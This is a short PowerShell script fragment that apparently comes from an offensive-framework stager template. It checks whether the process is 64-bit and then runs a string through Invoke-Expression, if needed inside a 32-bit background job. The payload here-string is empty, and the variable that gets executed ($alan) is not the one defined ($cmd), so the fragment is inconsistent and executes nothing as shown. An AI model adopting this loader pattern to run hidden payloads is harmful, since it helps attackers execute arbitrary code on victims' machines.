Set-StrictMode -Version 2

$cmd = @''@

if ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $alan | wait-job | Receive-job
}
else {
	IEX $alan
}